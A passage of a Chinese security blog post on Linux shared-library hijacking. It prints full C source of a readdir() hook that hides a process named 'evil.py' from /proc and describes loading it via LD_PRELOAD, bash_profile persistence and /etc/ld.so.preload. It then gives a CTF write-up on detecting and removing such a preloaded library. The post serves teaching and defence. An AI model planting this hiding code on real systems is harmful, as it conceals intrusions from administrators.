+<h3 id="预加载-preloading"><a href="#预加载-preloading" class="headerlink" title="预加载(preloading)"></a>预加载(preloading)</h3><p>通过预加载，Linux给了我们一个选项，在其他正常的系统库被加载之前加载一个自定义共享库。这意味着，如果自定义库导出的函数与系统库中的函数名相同，我们就可以用我们库中的自定义代码覆盖它，而所有的进程都会自动选择我们的自定义函数)</p>
+<p>例如，通过重写readdir()方法，在去去读/proc目录的时候，刻意隐藏某个进程。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Every process with this name will be excluded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* process_to_filter = <span class="string">&quot;evil.py&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a directory name given a DIR* handle</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_dir_name</span><span class="params">(DIR* dirp, <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">dirfd</span>(dirp);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    <span class="keyword">ssize_t</span> ret = <span class="built_in">readlink</span>(tmp, buf, size);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a process name given its pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_process_name</span><span class="params">(<span class="keyword">char</span>* pid, <span class="keyword">char</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strspn</span>(pid, <span class="string">&quot;0123456789&quot;</span>) != <span class="built_in">strlen</span>(pid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), <span class="string">&quot;/proc/%s/stat&quot;</span>, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = <span class="built_in">fopen</span>(tmp, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fgets</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), f) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fclose</span>(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> unused;</span><br><span class="line">    <span class="built_in">sscanf</span>(tmp, <span class="string">&quot;%d (%[^)]s&quot;</span>, &amp;unused, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_READDIR(dirent, readdir)                                \</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* (*<span class="title">original_</span>##<span class="title">readdir</span>)(<span class="title">DIR</span>*) =</span> <span class="literal">NULL</span>;               \</span><br><span class="line">                                                                        \</span><br><span class="line">struct dirent* readdir(DIR *dirp)                                       \</span><br><span class="line">&#123;                                                                       \</span><br><span class="line">    <span class="keyword">if</span>(original_#<span class="meta">#readdir == NULL) &#123;                                    \</span></span><br><span class="line">        original_#<span class="meta">#readdir = dlsym(RTLD_NEXT, #readdir);               \</span></span><br><span class="line">        <span class="keyword">if</span>(original_#<span class="meta">#readdir == NULL)                                  \</span></span><br><span class="line">        &#123;                                                               \</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error in dlsym: %s\n&quot;</span>, <span class="built_in">dlerror</span>());         \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">                                                                        \</span><br><span class="line">    struct dirent* dir;                                                 \</span><br><span class="line">                                                                        \</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)                                                            \</span><br><span class="line">    &#123;                                                                   \</span><br><span class="line">        dir = original_#<span class="meta">#readdir(dirp);                                 \</span></span><br><span class="line">        <span class="keyword">if</span>(dir) &#123;                                                       \</span><br><span class="line">            <span class="keyword">char</span> dir_name[<span class="number">256</span>];                                         \</span><br><span class="line">            <span class="keyword">char</span> process_name[<span class="number">256</span>];                                     \</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">get_dir_name</span>(dirp, dir_name, <span class="built_in"><span class="keyword">sizeof</span></span>(dir_name)) &amp;&amp;        \</span><br><span class="line">                <span class="built_in">strcmp</span>(dir_name, <span class="string">&quot;/proc&quot;</span>) == <span class="number">0</span> &amp;&amp;                       \</span><br><span class="line">                <span class="built_in">get_process_name</span>(dir-&gt;d_name, process_name) &amp;&amp;          \</span><br><span class="line">                <span class="built_in">strcmp</span>(process_name, process_to_filter) == <span class="number">0</span>) &#123;         \</span><br><span class="line">                <span class="keyword">continue</span>;                                               \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">        <span class="keyword">break</span>;                                                          \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">    <span class="keyword">return</span> dir;                                                         \</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DECLARE_READDIR</span>(dirent64, readdir64);</span><br><span class="line"><span class="built_in">DECLARE_READDIR</span>(dirent, readdir);</span><br></pre></td></tr></table></figure>
+
+<p>repo:<a target="_blank" rel="noopener" href="https://github.com/gianlucaborello/libprocesshider.git">https://github.com/gianlucaborello/libprocesshider.git</a></p>
+<p>clone下来之后直接make，就可以生成so文件</p>
+<p><img src="http://cdn.polowong.top/image-20221012104955791.png" alt="image-20221012104955791"></p>
+<p>使用预加载有几种方式：</p>
+<h3 id="1-LD-PRELOAD-环境变量"><a href="#1-LD-PRELOAD-环境变量" class="headerlink" title="1.LD_PRELOAD 环境变量"></a>1.LD_PRELOAD 环境变量</h3><p>LD_PRELOAD环境变量是会及时生效的，使用LD_PRELOAD加载恶意动态链接库方法如下：</p>
+<p>LD_PRELOAD=/lib/evil.so LD_PRELOAD的值设置为要预加载的动态链接库</p>
+<p>export LD_PRELOAD 导出环境变量使该环境变量生效</p>
+<p>unset LD_PRELOAD 解除设置的LD_PRELOAD环境变量</p>
+<p><img src="http://cdn.polowong.top/image-20221012111811033.png" alt="image-20221012111811033"></p>
+<p>运行evil.so 并且通过ps查看</p>
+<p><img src="http://cdn.polowong.top/image-20221012111901427.png" alt="image-20221012111901427"></p>
+<p>Unset LD_PRELOAD后再次通过ps查看</p>
+<p><img src="http://cdn.polowong.top/image-20221012111932986.png" alt="image-20221012111932986"></p>
+<p>LD_PRELOAD不仅可以通过shell设置后然后export，还可以通过修改bash_profile 永久保存</p>
+<p><img src="http://cdn.polowong.top/image-20221012112802802.png" alt="image-20221012112802802"></p>
+<p><img src="http://cdn.polowong.top/image-20221012112816426.png" alt="image-20221012112816426"></p>
+<h3 id="2-etc-ld-so-preload文件"><a href="#2-etc-ld-so-preload文件" class="headerlink" title="2./etc/ld.so.preload文件"></a>2./etc/ld.so.preload文件</h3><p>/etc/ld.so.preload是一种全局性的修改，影响范围比第一种方式更大，可以在该文件中指定so文件，以预加载恶意so文件。</p>
+<p>具体操作方法如下：</p>
+<p><img src="http://cdn.polowong.top/image-20221012105521366.png" alt="image-20221012105521366"></p>
+<p>先看一下刚才执行evil.py时ps的结果，可以看到evil.py</p>
+<p><img src="http://cdn.polowong.top/image-20221012105701680.png" alt="image-20221012105701680"></p>
+<p>现在再执行evil.py，查看ps aux的结果:</p>
+<p><img src="http://cdn.polowong.top/image-20221012110448820.png" alt="image-20221012110448820"></p>
+<p>可以看到彻底隐藏了evil.py的进程.</p>
+<p>当清空/etc/ld.preload中的内容后，可以看到进程又出现了</p>
+<p><img src="http://cdn.polowong.top/image-20221012110606228.png" alt="image-20221012110606228"></p>
+<h1 id="广东省强网杯Final-安全运维"><a href="#广东省强网杯Final-安全运维" class="headerlink" title="广东省强网杯Final-安全运维"></a>广东省强网杯Final-安全运维</h1><p>题目环境为Linux，当时状况如下：</p>
+<p>1.netstat 出现疑似外连行为</p>
+<p><img src="http://cdn.polowong.top/image-20221012121912315.png" alt="image-20221012121912315"></p>
+<p>2.ps aux发现反弹shell命令</p>
+<p><img src="http://cdn.polowong.top/image-20221012121937944.png" alt="image-20221012121937944"></p>
+<p>3.通过lsof查看端口 进程信息 无收获</p>
+<p><img src="http://cdn.polowong.top/image-20221012122059986.png" alt="image-20221012122059986"></p>
+<p><img src="http://cdn.polowong.top/image-20221012122137108.png" alt="image-20221012122137108"></p>
+<p>只能找到路径/root/qwb</p>
+<h3 id="赛时解"><a href="#赛时解" class="headerlink" title="赛时解"></a>赛时解</h3><p>比赛的时候做到这里实在是不知道怎么做了，实际上也没有找到运行的elf文件，最后随意翻了翻翻到了一个so文件，IDA打开之后看到内容就是反弹shell执行的命令，把so文件删掉之后这道题就算是patch了。</p>
+<h3 id="正确解"><a href="#正确解" class="headerlink" title="正确解"></a>正确解</h3><p>场景1.可以找到可执行文件</p>
+<p>通过ldd命令分析可执行文件所调用的动态库文件</p>
+<p><img src="http://cdn.polowong.top/image-20221012122414324.png" alt="image-20221012122414324"></p>
+<p>这里可以看到有libqwb.so(或者其他奇奇怪怪的so文件名)</p>
+<p>将该文件直接删除即可</p>
+<p>场景2.找不到可执行文件（so文件不在/usr/lib 或者/lib下）</p>
+<p>查看LD_PRELOAD环境变量，是否有可疑文件</p>
+<p><img src="http://cdn.polowong.top/image-20221012123303808.png"></p>
+<p>查看/etc/ld.so.conf文件内容 是否有可疑路径</p>
+<p><img src="http://cdn.polowong.top/image-20221012123323906.png" alt="image-20221012123323906"></p>
+<p>最终定位到tmp目录下的so文件，将其删除即可</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>本文所用demo均可在以下链接中找到</p>
+<p><a target="_blank" rel="noopener" href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/">https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/162604.html">https://www.freebuf.com/column/162604.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/223311.html">https://www.freebuf.com/articles/system/223311.html</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>Article Link</strong>
+      <p style="width: 100%;
+  word-wrap: break-word;
+  word-break: break-all;
+  overflow: hidden;">https://polosec.github.io/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/</p>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>Copyright Notice: </strong> All articles in this blog, unless otherwise stated, are under the<a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external"> CC BY 4.0 CN agreement</a>.Reprint please indicate the source!
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/polosec" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="http://cdn.polowong.top/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/polosec" target="_blank"><span class="text-dark">Polo</span><small class="ml-1x">CTFer&amp;Cybersec Researcher</small></a></h3>
+        <div>Wong</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="uyan_frame"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2022/05/13/java-cc1%E5%88%86%E6%9E%90/" title="Ysoserial Commons-Collections 1分析"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/polosec" target="_blank"> polosec </a>base on <a href="https://github.com/polosec/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+    <script defer type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=[object Object]"></script>
+
+
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+
+
+</body>
+</html>
